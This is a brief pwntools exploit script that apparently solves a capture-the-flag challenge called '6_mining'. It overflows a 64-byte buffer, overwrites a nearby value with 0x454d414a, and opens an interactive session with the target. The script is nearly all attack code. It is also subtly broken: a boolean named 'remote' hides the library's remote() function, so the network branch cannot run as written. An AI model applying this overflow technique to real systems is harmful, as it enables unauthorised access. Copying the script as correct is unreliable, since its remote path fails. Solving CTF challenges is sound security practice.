from pwn import *

#context.log_level = "debug"
remote = False

IP = ""
PORT = ""
FILENAME = "./6_mining"

if remote:
    p = remote(IP, PORT)
    elf = ELF(FILENAME)
else:
    p = process(FILENAME)
    elf = p.elf

payload = b"A"*64 + pack(0x454d414a)
p.sendlineafter("mines?", payload)

p.interactive()
